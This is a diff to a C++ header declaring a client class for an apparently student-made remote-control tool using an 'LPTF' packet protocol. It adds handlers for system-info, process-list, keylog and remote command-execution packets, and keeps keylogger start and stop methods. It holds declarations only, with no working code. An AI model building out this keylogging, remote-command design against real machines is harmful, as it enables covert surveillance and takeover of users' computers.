@@ -1,10 +1,10 @@
 #pragma once
 
+#include <memory>
 #include <thread>
 #include <atomic>
-#include <memory>
-#include <vector>
 #include <string>
+#include <map>
 #include "../utils/LPTF/LPTF_Socket.hpp"
 #include "../utils/LPTF/LPTF_Packet.hpp"
 #include "../utils/LPTF/LPTF_PacketType.hpp"
@@ -28,6 +28,21 @@ private:
     void serverRequestHandler();
     void startKeylogger();
     void stopKeylogger(const LPTF_Packet& packet);
+    
+    void setupConsole();
+    void loadAndConnectEnv();
+    void sendSystemInfo();
+    void printSystemInfo(const std::map<std::string, std::string>& sysInfo);
+    void listProcesses();
+    void launchServerThread();
+    void handlePacket(const LPTF_Packet& packet);
+    void handleServerException(const std::exception& e);
+
+    void handleGetInfoPacket(const LPTF_Packet&);
+    void handleKeylogPacket(const LPTF_Packet&);
+    void handleExecCommandPacket(const LPTF_Packet&);
+    void handleProcessListPacket(const LPTF_Packet&);
+    std::string getProcessListString(bool namesOnly);
 
     std::atomic<bool> running {true};
     std::unique_ptr<LPTF_Socket> socket;
